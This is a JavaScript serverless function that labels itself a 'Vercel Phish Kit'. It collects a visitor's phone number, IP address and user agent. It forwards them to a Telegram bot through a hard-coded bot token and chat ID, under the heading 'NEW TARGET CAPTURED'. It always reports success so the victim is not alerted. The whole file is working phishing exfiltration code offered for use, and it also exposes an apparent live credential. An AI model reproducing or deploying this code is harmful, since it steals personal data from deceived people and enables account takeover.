export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ error: 'Phone number is required' });
    }
    
    // Your bot credentials
    const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = '7933552719';
    
    // Get client info
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('id-ID');
    
    // Message to send
    const message = `🚨 *NEW TARGET CAPTURED*
    
📱 *Phone:* \`${phone}\`
📍 *IP:* \`${ip}\`
🌐 *User Agent:* \`${userAgent.substring(0, 50)}...\`
🕐 *Time:* ${time}
    
🔗 *Source:* Vercel Phish Kit`;
    
    // Send to Telegram Bot
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    
    // Always return success to user (even if Telegram fails)
    return res.status(200).json({
      success: true,
      message: 'Verification code sent successfully',
      telegram_sent: result.ok || false
    });
    
  } catch (error) {
    console.error('Error:', error);
    
    // Still return success to not alert user
    return res.status(200).json({
      success: true,
      message: 'Code sent (silent mode)',
      debug_error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
}